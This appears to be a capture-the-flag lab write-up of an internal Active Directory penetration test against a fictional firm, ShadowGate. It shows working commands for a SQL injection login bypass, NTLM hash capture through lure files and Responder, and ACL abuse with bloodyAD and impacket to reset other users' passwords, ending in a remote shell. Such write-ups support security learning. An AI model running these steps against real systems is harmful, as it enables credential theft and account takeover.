## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
## Objective

ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified, and have hired Hack Smarter to perform an internal network penetration test. Find all vulnerabilities and, if possible, elevate your privileges to Domain Admin.

### [](https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/shadowgate2-medium#user-content-initial-access)Initial Access

You have been provided with VPN access to their network, but no other information
```
### IP
```IP
10.1.88.141
```
### Enumeration
- Port Scan 
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: ShadowGate | Advanced Cyber Security Solutions
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-09 20:57:50Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-09T20:59:37+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:     016f ca06 03dd b832 2cce 8260 67b9 a567
| SHA-1:   040e a191 a804 b2b2 7248 1ca6 06a5 87fa c32d 2b8a
| SHA-256: 2fe1 374d 8eb3 cfd6 a7d6 10a0 cb55 660f 5610 0798 c1dd 5fc1 c732 8469 04e7 6f9e
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      syn-ack ttl 126 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.1.88.141:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-08-09T20:59:37+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-09T20:50:36
| Not valid after:  2056-08-09T20:50:36
| MD5:     eb68 2881 3620 61b1 a4a9 0632 2e62 89db
| SHA-1:   6558 dfa1 62e8 83d6 8b3e d311 398e 3eaf 049a 77af
| SHA-256: 2bab ba6c dc8e 1cc2 e30e 6ccc bf64 bc63 ec4f bba6 0019 4aa8 7ba4 e88d 3592 44b0
| ms-sql-ntlm-info:
|   10.1.88.141:1433:
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-09T20:59:37+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:     016f ca06 03dd b832 2cce 8260 67b9 a567
| SHA-1:   040e a191 a804 b2b2 7248 1ca6 06a5 87fa c32d 2b8a
| SHA-256: 2fe1 374d 8eb3 cfd6 a7d6 10a0 cb55 660f 5610 0798 c1dd 5fc1 c732 8469 04e7 6f9e
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-09T20:59:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Issuer: commonName=Shadowgate-CA/domainComponent=shadowgate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-07T17:46:45
| Not valid after:  2026-12-07T17:46:45
| MD5:     016f ca06 03dd b832 2cce 8260 67b9 a567
| SHA-1:   040e a191 a804 b2b2 7248 1ca6 06a5 87fa c32d 2b8a
| SHA-256: 2fe1 374d 8eb3 cfd6 a7d6 10a0 cb55 660f 5610 0798 c1dd 5fc1 c732 8469 04e7 6f9e
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Issuer: commonName=SG-DC01.shadowgate.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-18T09:38:28
| Not valid after:  2027-01-17T09:38:28
| MD5:     9ef5 efd9 61d1 a900 d192 dddf 2333 805a
| SHA-1:   f4f9 efa1 913e 0774 582f e4f0 a512 c901 11e7 3243
| SHA-256: 9c43 79d8 9e1d 4aca ff43 8e5d ebe8 7c67 fecf b3db 6285 6a3f f709 2cae a628 68e1
| rdp-ntlm-info:
|   Target_Name: SHADOWGATE
|   NetBIOS_Domain_Name: SHADOWGATE
|   NetBIOS_Computer_Name: SG-DC01
|   DNS_Domain_Name: shadowgate.local
|   DNS_Computer_Name: SG-DC01.shadowgate.local
|   DNS_Tree_Name: shadowgate.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-09T20:58:58+00:00
|_ssl-date: 2026-08-09T20:59:37+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49740/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49831/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
54311/tcp open  ms-sql-s      syn-ack ttl 126 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-09T20:50:36
| Not valid after:  2056-08-09T20:50:36
| MD5:     eb68 2881 3620 61b1 a4a9 0632 2e62 89db
| SHA-1:   6558 dfa1 62e8 83d6 8b3e d311 398e 3eaf 049a 77af
| SHA-256: 2bab ba6c dc8e 1cc2 e30e 6ccc bf64 bc63 ec4f bba6 0019 4aa8 7ba4 e88d 3592 44b0
| ms-sql-info:
|   10.1.88.141:54311:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 54311
| ms-sql-ntlm-info:
|   10.1.88.141:54311:
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
```
---
## System Info

```INFO
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
```
---
### SMB
```bash
$ netexec smb $TARGET -u "" -p ""
SMB         10.1.88.141     445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.88.141     445    SG-DC01          [+] shadowgate.local\:
```
- Shares
```bash
└─$ netexec smb $TARGET -u "" -p "" --shares
SMB         10.1.88.141     445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.88.141     445    SG-DC01          [+] shadowgate.local\:
SMB         10.1.88.141     445    SG-DC01          [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
----
### PORT 80
```bash
$ whatweb http://10.1.88.141
http://10.1.88.141 [200 OK] Country[RESERVED][ZZ], Email[careers@shadowgate.com,security@shadowgate.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.1.88.141], Microsoft-IIS[10.0], Script, Title[ShadowGate | Advanced Cyber Security Solutions], X-Powered-By[ASP.NET]
```
- Source-Code
```html
 <!-- Client-side configuration (used by frontend components) -->
    <script>
    const DEV_BASE_URL = "http://dev.shadowgate.local";
    const ENV = "production";
    </script>
</head>
<body>
```
- Sub-domain - `dev.shadowgate.local`
```bash
echo "10.1.88.141 dev.shadowgate.local shadowgate.local SG-DC01.shadowgate.local shadowgate.local SG-DC01" | sudo tee -a /etc/hosts
```
- Sub-domain
```html
Developer Portal Features
Secure File Upload System
Development Environment Access
— Coming Soon —
Real-time Threat Monitoring
— Coming Soon —
Network Security Dashboard
— Coming Soon —
Secure Development Tools
— Coming Soon —
Malware Analysis Suite
— Coming Soon —
Identity & Access Management
— Coming Soon —
Encrypted Document Storage
— Coming Soon —
Vulnerability Scanner
— Coming Soon —
Security Analytics
— Coming Soon —
File Upload Workflow
 Developer Upload: Upload your files to the secure development portal
 Automated Processing: Files are automatically transferred to the dev$ network share
 Security Review: All uploaded files are reviewed and processed by mitch.r
 Secure Storage: Files are stored in encrypted format with access logging
```
- Hint 
```hint 
 Security Review: All uploaded files are reviewed and processed by mitch.r
```
- Got first user - `mitch.r`, the head of  developer
```bash
Version: v1.0.3 (9dad6e1) - 08/09/26 - Ronnie Flathers @ropnop

2026/08/09 18:21:23 >  Using KDC(s):
2026/08/09 18:21:23 >  	10.1.88.141:88

2026/08/09 18:21:23 >  [+] VALID USERNAME:	 mitch.r@shadowgate.local
2026/08/09 18:21:23 >  Done! Tested 1 usernames (1 valid) in 0.277 seconds
```
- Valid User - `mitch.r@shadowgate.local`
- tried `SQL Injection` and it works `admin' AND 1=1 -- -`
```notes
- Login bypass using SQL injection
- upload vulnerability discovered 
- all types extension files were accepted 
```
- We Will be using NTLM_theft to generate reverse hash capture
```bash
$ git clone https://github.com/Greenwolf/ntlm_theft.git
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
Receiving objects: 100% (151/151), 2.12 MiB | 4.88 MiB/s, done.
Resolving deltas: 100% (73/73), done.
$ cd ntlm_theft
$ python3 ntlm_theft.py -g all -s 10.200.78.20 -f Project
/home/kali/Tools/AD_Tools/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: Project/Project.scf (BROWSE TO FOLDER)
Created: Project/Project-(url).url (BROWSE TO FOLDER)
Created: Project/Project-(icon).url (BROWSE TO FOLDER)
Created: Project/Project.lnk (BROWSE TO FOLDER)
Created: Project/Project.rtf (OPEN)
Created: Project/Project-(stylesheet).xml (OPEN)
Created: Project/Project-(fulldocx).xml (OPEN)
Created: Project/Project.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: Project/Project-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: Project/Project-(includepicture).docx (OPEN)
Created: Project/Project-(remotetemplate).docx (OPEN)
Created: Project/Project-(frameset).docx (OPEN)
Created: Project/Project-(externalcell).xlsx (OPEN)
Created: Project/Project.wax (OPEN)
Created: Project/Project.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: Project/Project.asx (OPEN)
Created: Project/Project.jnlp (OPEN)
Created: Project/Project.application (DOWNLOAD AND OPEN)
Created: Project/Project.pdf (OPEN AND ALLOW)
Created: Project/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: Project/Project.library-ms (BROWSE TO FOLDER)
Created: Project/Autorun.inf (BROWSE TO FOLDER)
Created: Project/desktop.ini (BROWSE TO FOLDER)
Created: Project/Project.theme (THEME TO INSTALL
Generation Complete.
```
- Upload File `Project.lnk` and turn on responder -I tun0
```bash
sudo responder -I tun0

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.1.88.141
[SMB] NTLMv2-SSP Username : SHADOWGATE\mitch.r
[SMB] NTLMv2-SSP Hash     : [ntlmv2 hash omitted]
```
- Hashcat - cracked Password - `[password omitted]`
- User `BloodHound-python`
```bash
bloodhound-python \
  -u '$USER' \
  -p '$PASS' \
  -d '$DOMAIN' \
  -ns $TARGET \
  -dc '$DC01' \
  -c All
```
- We Got User Access - `mitch.r:[password omitted]`
```bash


MITCH.R@SHADOWGATE.LOCAL

 -ForceChangePassword - RYAN.J@SHADOWGATE.LOCAL

 -ForceChangePassword - MILO.W@SHADOWGATE.LOCAL
 
```
- Check The Writing permission - `BloodyAD`
```bash
$ bloodyad \
--host "$TARGET" \
-d "$DOMAIN" \
-u "$USER" \
-p "$PASS" \
get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=shadowgate,DC=local
permission: WRITE

distinguishedName: CN=mitch.r,CN=Users,DC=shadowgate,DC=local
permission: WRITE

distinguishedName: DC=shadowgate.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=shadowgate,DC=local
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.shadowgate.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=shadowgate,DC=local
permission: CREATE_CHILD
```
- Access to forcefully change password for users - `ryan.j` & `milo.w`
```bash
bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u "$USER" \
  -p "$PASS" \
  set password $VICTIM '[password omitted]'
[+] Password changed successfully!
```
- User - `ryan.j`  New Password - `[password omitted]`
```bash
$ nxc smb 10.1.61.49 -u "ryan.j" -p "$PASS"
SMB         10.1.61.49      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.49      445    SG-DC01          [+] shadowgate.local\ryan.j:[password omitted]
```
- User - `Ryan.j` doesn't have any outbound scope and we have another user to go with `Milo.w`
```bash
bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u "$USER" \
  -p "$PASS" \
  set password $VICTIM '[password omitted]'
[+] Password changed successfully!
```
- User - `Milo.W`  New Password - `[password omitted]`
```bash
$ nxc smb 10.1.61.49 -u "milo.w" -p "$PASS"
SMB         10.1.61.49      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.49      445    SG-DC01          [+] shadowgate.local\milo.w:[password omitted]
```
- In `BloodHound` we have mapped the path 
```bash
milo.w -> WriteOwner -> SVC_MSSQL@SHADOWGATE.LOCAL
```
- Change WriteOwner to GenericAll Permission
```bash
$ impacket-owneredit \
  -action write \
  -new-owner "$USER" \
  -target "$VICTIM" \
  -dc-ip "$TARGET" \
  "$DOMAIN/$USER:$PASS" \
  -debug
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Initializing domainDumper()
[+] Target principal found in LDAP (svc_mssql)
[+] Found new owner SID: S-1-5-21-2396436576-3267128377-3646372360-1108
[*] Current owner information below
[*] - SID: S-1-5-21-2396436576-3267128377-3646372360-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=shadowgate,DC=local
[+] Attempt to modify the OwnerSid
[*] OwnerSid modified successfully!
```
- Owner Change & next `GenericAll`
```bash
$ bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u "$USER" \
  -p "$PASS" \
  add genericAll "$VICTIM" "$USER"
[+] milo.w has now GenericAll on svc_mssql
```
- Next Changed Password
```bash
 bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u "$USER" \
  -p "$PASS" \
  set password "$VICTIM" "$PASS"
[+] Password changed successfully!
```
- Password Changed Successfully
```bash
$ nxc smb 10.1.61.49 -u "svc_mssql" -p "$PASS"
SMB         10.1.61.49      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.49      445    SG-DC01          [+] shadowgate.local\svc_mssql:[password omitted]
```
----
### MSSQL SERVICE 
- Using `Impacket-mssqlclient`
```bash
$ impacket-mssqlclient  'svc_mssql:[password omitted]'@shadowgate.local -windows-auth

SHADOWGATE\svc_mssql
SQL (SHADOWGATE\svc_mssql  guest@msdb)> SELECT DB_NAME();
----
msdb
SQL (SHADOWGATE\svc_mssql  guest@msdb)> SELECT IS_SRVROLEMEMBER('sysadmin');
-
0
SQL (SHADOWGATE\svc_mssql  guest@msdb)> use master
ENVCHANGE(DATABASE): Old Value: msdb, New Value: master
INFO(SG-DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
SQL (SHADOWGATE\svc_mssql  guest@master)> SELECT SUSER_SNAME();
--------------------
SHADOWGATE\svc_mssql
SQL (SHADOWGATE\svc_mssql  guest@master)> SELECT DB_NAME();
------
master
SQL (SHADOWGATE\svc_mssql  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-
0
SQL (SHADOWGATE\svc_mssql  guest@master)> enum_logins
name                   type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
--------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                     SQL_LOGIN                 1          1               0             0            0              0           0           0           0
SHADOWGATE\svc_mssql   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0
SHADOWGATE\bogdan.r    WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0

SQL (SHADOWGATE\svc_mssql  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee                grantor
----------   --------   ---------------   ----------   --------------------   -------------------
b'LOGIN'     b''        IMPERSONATE       GRANT        SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r
SQL (SHADOWGATE\svc_mssql  guest@master)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
SG-DC01\SQLEXPRESS   SQLNCLI            SQL Server    SG-DC01\SQLEXPRESS   NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
SQL (SHADOWGATE\svc_mssql  guest@master)> enum_owner
Database     Owner
----------   ------------------------
master       sa
tempdb       sa
model        sa
msdb         sa
ShadowGate   SHADOWGATE\Administrator
SQL (SHADOWGATE\svc_mssql  guest@master)>
```
- Key Finding
```bash
execute     permission_name      grantee                grantor

b'LOGIN'   IMPERSONATE      SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r
```
- `bogdan.r` hash is store in the `mssql` which is claimed using `responder`
```bash
SQL (SHADOWGATE\svc_mssql  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee                grantor
----------   --------   ---------------   ----------   --------------------   -------------------
b'LOGIN'     b''        IMPERSONATE       GRANT        SHADOWGATE\svc_mssql   SHADOWGATE\bogdan.r
```
- Responder
```bash
sudo responder -I tun0
bogdan.r::SHADOWGATE:3ec4838d8101051d:49D070B8A4106F0FBB854C8D768C56D2:[ntlmv2 hash omitted]
```
- Hashcat Cracked Password 
```Creds
USER=bogdan.r
PASS=[password omitted]
```
- BloodHound 
```bash

BOGDAN.R -> 

-GenericALL -< DANIEL.R

-GenericALL -< OSCAR.M

```
---
- Bloody Ad change the Password for user `OSCAR.M`  as is the member of `8`
```bash
$bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u "$USER" \
  -p "[password omitted]" \
  set password "oscar.m" '[password omitted]'
[+] Password changed successfully!
```
- Verify 
```bash
$ nxc winrm "$TARGET" \
  -u 'oscar.m' \
  -p '[password omitted]' \
  -d "$DOMAIN"
WINRM       10.1.61.49      5985   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.1.61.49      5985   SG-DC01          [-] \oscar.m:[password omitted]

┌──(kali㉿kali)-[~]
└─$ nxc smb "$TARGET" \
  -u 'oscar.m' \
  -p '[password omitted]' \
  -d "$DOMAIN"
SMB         10.1.61.49      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.49      445    SG-DC01          [-] \oscar.m:[password omitted] STATUS_INVALID_LOGON_HOURS
```
- Error - ` STATUS_INVALID_LOGON_HOURS`
```bash
 sAMAccountName userAccountControl memberOf logonHours userWorkstations accountExpires
# extended LDIF
#
# LDAPv3
# base <DC=shadowgate,DC=local> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=oscar.m))
# requesting: sAMAccountName userAccountControl memberOf logonHours userWorkstations accountExpires
#

# oscar.m, Users, shadowgate.local
dn: CN=oscar.m,CN=Users,DC=shadowgate,DC=local
memberOf: CN=Shadowgate-IT-Support,CN=Users,DC=shadowgate,DC=local
memberOf: CN=Remote Management Users,CN=Builtin,DC=shadowgate,DC=local
userAccountControl: 66048
logonHours:: AAAAAAAAAAAAAAAAAAAAAAAAAAAA
accountExpires: 9223372036854775807
sAMAccountName: oscar.m

# search reference
ref: ldap://ForestDnsZones.shadowgate.local/DC=ForestDnsZones,DC=shadowgate,DC
 =local

# search reference
ref: ldap://DomainDnsZones.shadowgate.local/DC=DomainDnsZones,DC=shadowgate,DC
 =local

# search reference
ref: ldap://shadowgate.local/CN=Configuration,DC=shadowgate,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
- Issue - `logonHours:: AAAAAAAAAAAAAAAAAAAAAAAAAAAA`
```bash
bloodyad set object  --help
usage: bloodyad set object [-h] [-v V] [--raw] [--b64] target attribute

positional arguments:
  target      sAMAccountName, DN or SID of the target
  attribute   name of the attribute

options:
  -h, --help  show this help message and exit
  -v V        add value if attribute doesn't exist, replace value if attribute exists, delete if no value given, can be called multiple times if multiple values to set
              (e.g -v HOST/janettePC -v HOST/janettePC.bloody.local) (default: [])
  --raw       if set, will try to send the values provided as is, without any encoding (default: False)
  --b64       expect base64 values in -v (available only with --raw) (default: False)
```
- Solution
```bash
$ bloodyad \
  --host "$TARGET" \
  -d "$DOMAIN" \
  -u 'bogdan.r' \
  -p '[password omitted]' \
  set object \
  'CN=oscar.m,CN=Users,DC=shadowgate,DC=local' \
  logonHours \
  --raw \
  --b64 \
  -v '////////////////////////////'
[+] CN=oscar.m,CN=Users,DC=shadowgate,DC=local's logonHours has been updated
```
- Verify the change
```bash
─$ nxc smb "$TARGET" \
  -u 'oscar.m' \
  -p '[password omitted]' \
  -d "$DOMAIN"
SMB         10.1.61.49      445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.61.49      445    SG-DC01          [+] \oscar.m:[password omitted]

$ nxc winrm "$TARGET" \
  -u 'oscar.m' \
  -p '[password omitted]' \
  -d "$DOMAIN"
WINRM       10.1.61.49      5985   SG-DC01          [*] Windows 10 / Server 2019 Build 17763 (name:SG-DC01) (domain:shadowgate.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.1.61.49      5985   SG-DC01          [+] \oscar.m:[password omitted] (Pwn3d!)
```
- Pwned
```bash
$ evil-winrm -i "$TARGET" -u "$USER" -p "$PASS"

Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\oscar.m\Documents> whoami /all

USER INFORMATION
----------------
User Name          SID
================== ==============================================
shadowgate\oscar.m S-1-5-21-2396436576-3267128377-3646372360-1109

GROUP INFORMATION
-----------------
Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
SHADOWGATE\Shadowgate-IT-Support            Group            S-1-5-21-2396436576-3267128377-3646372360-1115 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------
User claims unknown.
Kerberos support for Dynamic Access Control on this device has been disabled.
```
- Flag
```bash
*Evil-WinRM* PS C:\Users\oscar.m\Documents> cd ..
dir*Evil-WinRM* PS C:\Users\oscar.m> dir
    Directory: C:\Users\oscar.m
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        12/4/2025   1:02 PM                Desktop
d-r---        5/31/2026   7:31 AM                Documents
d-----        12/5/2025   7:06 AM                Mails

*Evil-WinRM* PS C:\Users\oscar.m> cd Desktop
*Evil-WinRM* PS C:\Users\oscar.m\Desktop> dir


    Directory: C:\Users\oscar.m\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/4/2025   1:03 PM           6553 user.txt


*Evil-WinRM* PS C:\Users\oscar.m\Desktop> type user.txt

[flag omitted]


⣟⢯⣻⡝⣯⢻⡝⣯⢻⡝⣯⢻⡝⣯⢻⡝⣯⢻⡝⣯⢻⡝⣯⢻⡝⣯⢻⣝⣯⣻⣝⢯⣻⢭⣻⣝⣯⣝⢯⣏⢿⡹⣝⢯⡝⣯⡝⣯⡝⣯⡝⣯⠽⣭⢯⡽⣭⢯⠽⣭⠯⡽⣭⢯⡝
